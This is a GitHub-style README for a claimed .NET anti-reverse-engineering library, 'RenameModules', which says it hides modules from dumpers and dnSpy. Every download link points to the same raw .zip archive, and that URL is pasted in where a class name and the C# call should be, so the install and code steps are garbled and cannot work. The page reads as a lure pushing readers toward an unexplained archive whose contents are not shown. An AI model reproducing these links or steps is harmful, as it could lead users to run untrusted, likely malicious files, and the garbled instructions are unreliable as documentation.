# 🛡️ RenameModules-Anti-Crack - Keep Your .NET Applications Safe

[![Download](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)

## 📦 Overview

**Rename Modules** is a C# library designed to protect .NET applications by dynamically renaming modules (DLL and EXE) in the process memory. This helps mask them as system files, making it harder for attackers to reverse-engineer your software.

## 🚀 Getting Started

To begin using RenameModules, follow these simple steps:

### 1. Visit This Page to Download

Go to the Releases page to download the latest version of RenameModules:

[Download Latest Release](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)

### 2. Install the Library

After downloading, add the `https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip` class to your project. This class contains all the necessary code to integrate the protection features into your application.

### 3. Implement the Protection

Call the `Execute` method at the start of your program. This method initializes the renaming process and engages the protection features.

```csharp
https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip();
```

## 🛡️ Protects Against

Using RenameModules effectively helps protect your application from various reverse-engineering tools. It complicates the operation of these tools and disrupts their functionality:

- **Extreme Dumper / MegaDumper**: These tools can extract code and data from your application. RenameModules makes this process more difficult.
- **dnSpy / dnSpyEx (Debugger)**: These are popular debugging tools among attackers. The library makes it harder to analyze and manipulate your software.
- **And More**: The protection features extend to various other reverse-engineering techniques.

## 💡 Tip

For optimal security, consider these recommendations:

- **Encrypt Strings**: Use string encryption methods to prevent easy access to sensitive data within your application.
- **Utilize Syscalls**: Instead of regular P/Invoke calls, employ direct system calls to enhance security further.
